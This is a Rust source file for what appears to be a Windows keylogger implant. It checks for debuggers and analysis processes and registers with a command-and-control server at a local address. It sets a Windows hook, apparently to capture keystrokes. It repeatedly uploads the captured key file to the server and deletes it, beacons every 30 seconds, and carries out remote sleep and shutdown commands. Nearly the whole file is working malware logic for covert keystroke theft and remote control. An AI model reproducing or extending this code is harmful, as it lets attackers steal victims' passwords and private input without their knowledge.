mod server;
mod system;
mod encode;
use std::{sync::Arc, u32};
use system::{get_windows_version, read_file, set_windows_hook, delete_file,check_for_debugging, check_for_process};
use tokio::time::{sleep, Duration, Sleep};
use std::sync::atomic::{AtomicBool, Ordering};
use rand::{rngs::StdRng, SeedableRng, Rng};


macro_rules! unwrap_or_panic {
    ($expr: expr) => {
        match $expr{
            Ok(res) =>{
                res
            },
                Err(e) => {panic!("Couldn't connect to server {}", e)
            }
        }   
    };
}
#[tokio::main]
async fn main() {

    //anti sandbox
    // sleep(Duration::from_secs(600)).await;

    check_for_debugging();
    check_for_process();

    const URL: &'static str = "http://127.0.0.1:5000";


    let paused = Arc::new(AtomicBool::new(false));
    let server = Arc::new(server::Connection::new(&URL));
    let arch = get_windows_version();

    let mut counter_beconing = 0;
    let id: String = unwrap_or_panic!(server.register(arch).await);

    let server_for_beconing = Arc::clone(&server);
    let id_beconing = id.clone();

    let server_for_exfil = Arc::clone(&server);
    let id_exfil = id.clone();

    let server_for_command = Arc::clone(&server);
    let id_command = id.clone();

    let paused_hook = Arc::clone(&paused);

    tokio::spawn(async move {
        loop {
            if paused_hook.load(Ordering::Relaxed) {
                sleep(Duration::from_secs(1)).await;
                continue;
            }

            unsafe {
                set_windows_hook();
            }
            break;
        }
    });

    let paused_command = Arc::clone(&paused);
    
    tokio::spawn(async move {
        let mut rng = StdRng::from_os_rng();
        loop {
            if paused_command.load(Ordering::Relaxed) {
                sleep(Duration::from_secs(1)).await;
                continue;
            }
            
            let rec = unwrap_or_panic!(server_for_command.get_command(&id_command).await);
            execute_command(&rec, paused_command.clone()).await;
            sleep(Duration::from_secs(rng.gen_range(10..40))).await;
        }
    });

    let paused_exfil = Arc::clone(&paused);

    let mut rng = StdRng::from_os_rng();

    tokio::spawn(async move {
        loop {
            if paused_exfil.load(Ordering::Relaxed) {
                sleep(Duration::from_secs(1)).await;
                continue;
            }

            let keys = read_file();
            if server_for_exfil.send_data(&id_exfil, &keys.clone()).await.is_ok() {
                delete_file();
            }

            sleep(Duration::from_secs(rng.gen_range(10..40))).await;
        }
    });

    // Main loop for beaconing
    loop {
        match server_for_beconing.becon(&id_beconing).await {
            Ok(_) => counter_beconing = 0,
            Err(_) => counter_beconing += 1,
        };

        if counter_beconing >= 2 {
            std::process::exit(1);
        }

        sleep(Duration::from_secs(30)).await;
    }
}

async fn execute_command(cmd: &str, paused: Arc<AtomicBool>) {
    let cmds: Vec<_> = cmd.split(':').collect();

    match cmds[0] {
        "slp" => {

            if let Ok(secs) = cmds[1].replace('\n', "").parse() {
                println!("Sleeping all background threads for {} seconds", secs);
                paused.store(true, Ordering::Relaxed);
                sleep(Duration::from_secs(secs)).await;
                paused.store(false, Ordering::Relaxed);
            }
        }
        "shd" => {
            std::process::exit(1);
        }
        "pwn" => {
            println!("{}", cmds[1]);
        }
        _ => {}
    }
}